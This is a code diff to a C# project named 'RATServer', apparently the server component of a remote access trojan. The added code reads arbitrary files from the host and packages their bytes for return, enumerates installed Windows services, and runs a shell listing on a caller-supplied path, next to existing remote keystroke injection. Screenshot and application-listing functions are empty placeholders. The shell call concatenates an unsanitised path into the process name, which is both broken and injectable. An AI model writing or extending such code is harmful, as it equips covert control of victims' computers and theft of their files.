@@ -7,6 +7,7 @@ using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.ServiceProcess;
 
 namespace RATServer
 {
@@ -59,6 +60,42 @@ namespace RATServer
         public static void KeyPress(string Keys)
         {
             SendKeys.SendWait(Keys);
+        }
+        public static Response Retrieve(string Path)
+        {
+            Response r = new Response();
+            r.Type = "Data";
+            r.Msg = "FileName.txt";
+            r.Data = File.ReadAllBytes(Path);
+            return r;
+        }
+        public static string Services()
+        {
+            string x = "";
+            ServiceController[] sc = ServiceController.GetServices();
+            foreach (ServiceController s in sc) x += s.DisplayName + Environment.NewLine;
+            return x;
+        }
+        public static string Search(string Path)
+        {
+            Process p = new Process();
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.FileName = "cmd.exe dir " + Path;
+            p.Start();
+            string o = p.StandardOutput.ReadToEnd();
+            p.WaitForExit();
+            return o;
+        }
+        public static byte[] ScreenShot(string Path)
+        {
+            //work in progress
+            return new byte[0];
+        }
+        public static string Applications()
+        {
+            //work in progress
+            return "";
         }
     }
 }
